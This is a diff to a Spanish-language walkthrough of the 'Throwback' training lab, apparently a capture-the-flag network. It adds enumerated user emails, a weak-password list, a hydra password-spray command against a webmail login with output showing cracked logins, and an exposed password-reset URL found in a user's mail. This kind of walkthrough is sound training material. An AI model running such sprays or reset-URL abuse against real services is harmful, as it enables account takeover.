@@ -34,7 +34,7 @@ tbhguest:WelcomeTBH1!
 ```
 Con estas creds aparte de dos flags en esta maquina podemos enumerar una serie de correos de este servidor
 ```
-HumphreyW@throwback.local
+HumphreyW@throwback.local 
 SummersW@throwback.local
 FoxxR@throwback.local
 DaibaN@throwback.local
@@ -47,4 +47,45 @@ MurphyF@throwback.local
 JeffersD@throwback.local
 HorsemanB@throwback.local
 ```
-Esto puede ser util luego
+Esto puede sernos muy útil luego.
+
+## Exploit
+### Password spray
+En otra de las máquinas encontramos una contraseña para HumpreyW, si probamos a hacer password spray en este servicio puede que otro usuario la tenga o podemos ir probando con credenciales debiles como:
+```
+Summer2020
+Management2020
+Management2018
+Password2020
+Throwback2020
+Password123
+```
+En ambos casos tiraremos de hydra
+```
+hydra -L users -P LIST 10.200.27.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' 
+
+[80][http-post-form] host: 10.200.27.232   login: PeanutbutterM   password: Summer2020
+[80][http-post-form] host: 10.200.27.232   login: DaviesJ   password: Management2018
+[80][http-post-form] host: 10.200.27.232   login: MurphyF   password: Summer2020
+[80][http-post-form] host: 10.200.27.232   login: GongoH   password: Summer2020
+[80][http-post-form] host: 10.200.27.232   login: JeffersD   password: Summer2020
+```
+Esto me deja rapidamente con solo 5 usuarios de la primera lista por comprometer, tiremos con rockyou de fondo por si hay suerte y cae otro
+
+## More enum
+### MurphyF
+Dentro de los mensjaes de Murphy tenemos un link para hacer password reset de otras accounts
+```
+Dear Frank Murphy,
+
+Due to the recent firing of the Timekeep developer who had access to our
+database, we have decided to issue a password reset. You can do so by
+replacing your user account name and your new password in the following
+URL:
+
+http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD
+
+Thank you,
+IT Security.
+
+```
